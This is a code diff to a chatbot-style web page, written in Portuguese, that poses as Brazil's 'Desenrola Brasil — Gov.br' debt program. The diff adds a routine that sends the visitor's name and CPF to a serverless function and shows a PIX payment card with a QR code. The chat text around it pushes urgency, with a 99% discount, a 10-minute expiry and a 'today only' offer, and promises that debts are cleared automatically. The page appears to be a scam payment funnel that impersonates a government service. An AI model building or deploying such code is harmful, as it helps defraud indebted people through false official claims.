@@ -805,6 +805,128 @@
       }
 
       // ================================================================
+      // Gerar PIX via Netlify Serverless Function (seguro)
+      // ================================================================
+      async function gerarPixComAPI() {
+        addTyping();
+        await sleep(800);
+        removeTyping();
+
+        try {
+          // Chamar a função serverless na Netlify
+          const response = await fetch('/.netlify/functions/gerar-pix', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              nome: NOME_COMPLETO,
+              cpf: CPF,
+              codigoAcordo: CODIGO_ACORDO
+            })
+          });
+
+          const json = await response.json();
+
+          if (!response.ok) {
+            throw new Error(json.error || 'Erro ao gerar PIX');
+          }
+
+          var copypaste = json.copypaste;
+          if (!copypaste) throw new Error('PIX não gerado.');
+
+          var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=" + encodeURIComponent(copypaste);
+
+          // Card visual - EXATO como na imagem
+          var cardRow = document.createElement("div");
+          cardRow.style.marginLeft = "37px";
+          cardRow.style.marginBottom = "14px";
+          cardRow.innerHTML = 
+            '<div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.1);font-family:\'Inter\',sans-serif;">' +
+            // Header azul com foto + raio
+            '<div style="background:#1351B4;color:#fff;padding:12px 14px;display:flex;align-items:center;gap:8px;">' +
+            '<img src="' + AVATAR + '" style="width:32px;height:32px;border-radius:50%;flex-shrink:0;border:2px solid rgba(255,255,255,.3);">' +
+            '<span style="font-size:18px;flex-shrink:0;">⚡</span>' +
+            '<div style="flex:1;line-height:1.3;"><strong style="font-size:14px;display:block;">Cobrança PIX Gerada</strong><span style="font-size:11px;opacity:.85;">Programa Desenrola Brasil — Gov.br</span></div>' +
+            '</div>' +
+            // Corpo - linhas com 2 colunas
+            '<div style="padding:14px;border-bottom:1px solid #f0f0f0;">' +
+            '<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;padding-bottom:10px;border-bottom:1px dashed #ddd;">' +
+            '<span style="font-size:12px;color:#aaa;">Beneficiário</span>' +
+            '<span style="font-size:13px;font-weight:700;color:#1a1a1a;">' + NOME_COMPLETO + '</span>' +
+            '</div>' +
+            '<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;padding-bottom:10px;border-bottom:1px dashed #ddd;">' +
+            '<span style="font-size:12px;color:#aaa;">CPF</span>' +
+            '<span style="font-size:13px;font-weight:700;color:#1a1a1a;">' + CPF_FORMATADO + '</span>' +
+            '</div>' +
+            '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;padding-bottom:10px;border-bottom:1px dashed #ddd;">' +
+            '<span style="font-size:12px;color:#aaa;min-width:80px;">Descrição</span>' +
+            '<span style="font-size:13px;font-weight:700;color:#1a1a1a;text-align:right;">Quitação de Dívidas — Acordo<br>' + CODIGO_ACORDO + '</span>' +
+            '</div>' +
+            '<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;padding-bottom:10px;border-bottom:1px dashed #ddd;">' +
+            '<span style="font-size:12px;color:#aaa;">Valor a pagar</span>' +
+            '<span style="font-size:14px;font-weight:700;color:#1a9c3e;">R$ ' + CONFIG.VALOR_PIX.toFixed(2) + '</span>' +
+            '</div>' +
+            '<div style="display:flex;justify-content:space-between;align-items:baseline;">' +
+            '<span style="font-size:12px;color:#aaa;">🕐 Validade</span>' +
+            '<span style="font-size:14px;font-weight:700;color:#e53935;">09:29</span>' +
+            '</div>' +
+            '</div>' +
+            // QR Code - centralizado
+            '<div style="text-align:center;padding:16px;border-bottom:1px dashed #ddd;">' +
+            '<img src="' + qrUrl + '" style="width:160px;height:160px;border:2px solid #f0f0f0;border-radius:4px;">' +
+            '</div>' +
+            // Instrução
+            '<div style="padding:12px 14px;font-size:12px;color:#666;text-align:center;border-bottom:1px dashed #ddd;">' +
+            'Escaneie o QR Code com seu banco ou copie o código abaixo:' +
+            '</div>' +
+            // Copypasta - monospace
+            '<div style="padding:10px 14px;background:#f9f9f9;font-size:11px;color:#444;word-break:break-all;line-height:1.6;font-family:monospace;text-align:left;">' + copypaste + '</div>' +
+            '</div>';
+          msgs.appendChild(cardRow);
+          scroll();
+
+          // Botão copiar (sem emoji)
+          var copyRow = document.createElement("div");
+          copyRow.style.marginLeft = "37px";
+          copyRow.style.marginBottom = "14px";
+          var copyBtn = document.createElement("button");
+          copyBtn.style.width = "100%";
+          copyBtn.style.padding = "13px";
+          copyBtn.style.background = "#1351B4";
+          copyBtn.style.color = "#fff";
+          copyBtn.style.border = "none";
+          copyBtn.style.borderRadius = "6px";
+          copyBtn.style.fontSize = "14px";
+          copyBtn.style.fontWeight = "700";
+          copyBtn.style.cursor = "pointer";
+          copyBtn.style.fontFamily = "'Inter',sans-serif";
+          copyBtn.textContent = "Copiar código PIX";
+          copyBtn.onclick = function () {
+            navigator.clipboard.writeText(copypaste).then(function(){
+              copyBtn.textContent = "✅ COPIADO!";
+              copyBtn.style.background = "#1a9c3e";
+              setTimeout(function(){ 
+                copyBtn.textContent = "Copiar código PIX";
+                copyBtn.style.background = "#1351B4";
+              }, 2000);
+            });
+          };
+          copyRow.appendChild(copyBtn);
+          msgs.appendChild(copyRow);
+          scroll();
+
+          // Mensagem final - encerra o funil aqui
+          await botSay("Este código expira em 10 minutos. Após o pagamento, suas dívidas serão quitadas automaticamente.");
+          
+          // Funil termina aqui - não adiciona mais nada
+
+        } catch (err) {
+          await botSay("❌ Erro ao gerar PIX: " + err.message);
+        }
+      }
+
+      // ================================================================
       // Fluxo de conversa (IDÊNTICO ao original)
       // ================================================================
       async function startFlow() {
@@ -813,7 +935,7 @@
             "<em><strong>(Dados incompletos. Redirecionando para o início...)</strong></em>"
           );
           setTimeout(function () {
-            window.location.href = "../PT1/index.html";
+            window.location.href = "index.html";
           }, 1800);
           return;
         }
@@ -867,7 +989,7 @@
                   "Por favor, acesse o site com o seu CPF para prosseguir."
                 );
                 setTimeout(function () {
-                  window.location.href = "../PT1/index.html";
+                  window.location.href = "index.html";
                 }, 1500);
               }, 600);
             }
@@ -996,28 +1118,21 @@
           await botSay(
             "<strong><em>Atenção!</em></strong> <em>Oferta Válida Apenas para hoje.</em>"
           );
-          return await botSay(
-            "<em>Clique no botão abaixo para ser redirecionado ao pagamento</em>"
+          var btnClicado = await addButtons(["REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME"], false, true, true);
+          
+          // Mostra instruções
+          await botSay(
+            "<strong>⚠️ Instruções de pagamento:</strong><br><br>" +
+            "• O código PIX expira em 10 minutos<br>" +
+            "• O pagamento deve ser realizado imediatamente para <strong>garantir o desconto de 99%</strong><br>" +
+            "• Após o pagamento, todas as dívidas em seu CPF serão quitadas automaticamente<br>" +
+            "• Caso não seja pago, o acordo será cancelado e as dívidas continuarão acumulando juros"
           );
+          
+          // Gera PIX automaticamente
+          await sleep(1500);
+          await gerarPixComAPI();
         });
-
-        // ============================================================
-        // BOTÃO FINAL: Redireciona para o checkout externo
-        // ============================================================
-        await sleep(600);
-        var finRow = document.createElement("div");
-        finRow.style.marginLeft = "37px";
-        finRow.style.marginBottom = "8px";
-        var finBtn = document.createElement("button");
-        finBtn.className = "btn-link-final";
-        finBtn.textContent = "REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME";
-        finBtn.onclick = function () {
-          finRow.remove();
-          redirecionarCheckout();
-        };
-        finRow.appendChild(finBtn);
-        msgs.appendChild(finRow);
-        scroll();
       }
 
       window.addEventListener("load", function () {
